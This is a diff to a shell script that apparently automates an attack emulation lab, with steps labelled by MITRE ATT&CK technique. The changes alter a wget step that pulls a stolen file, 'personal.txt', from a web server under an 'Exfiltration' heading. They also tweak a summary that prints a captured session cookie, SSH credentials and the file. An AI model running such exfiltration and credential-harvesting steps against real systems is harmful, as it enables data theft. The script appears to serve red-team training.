@@ -152,7 +152,7 @@ echo "############ Exfiltration ############"
 echo "============MITRE ATT&CK technique: Exfiltration Over Alternative Protocol============"
 echo "############ Transferring file to Attacker machine ############"
 xdotool windowactivate $MAIN
-xdotool type "wget http://$WEB_IP/uploads/personal.txt";xdotool key Return
+gnome-terminal -- wget http://$WEB_IP/uploads/personal.txt
 echo ""
 
 echo ""
@@ -169,30 +169,30 @@ echo "############# Important Information #############"
 echo "#################################################"
 echo "#################################################"
 echo "#################################################"
-
+echo ""
 echo "** ATTACKER_IP/PREFIX **"
 echo $ATTACKER_IP/$PREFIX
-
+echo ""
 echo "** NETWORK **"
 echo $NETWORK/$PREFIX
-
+echo ""
 echo "** IPs to ignore **"
 echo $IGNORE_IP_1
 echo $IGNORE_IP_2
-
+echo ""
 echo "** WEB_IP **"
 echo $WEB_IP
-
+echo ""
 echo "** WEB_DIR **"
 echo $WEB_DIR
-
+echo ""
 echo "** Session Cookie **"
 echo $COOKIE
-
+echo ""
 echo "**  Boss SSH Details **"
 echo "SSH Credentials"
 echo "IP\tUsername\tPassword"
 echo "$BOSSIP\t$SSHUSER\t$SSHPASS"
-
+echo ""
 echo "** Boss file **"
 cat personal.txt
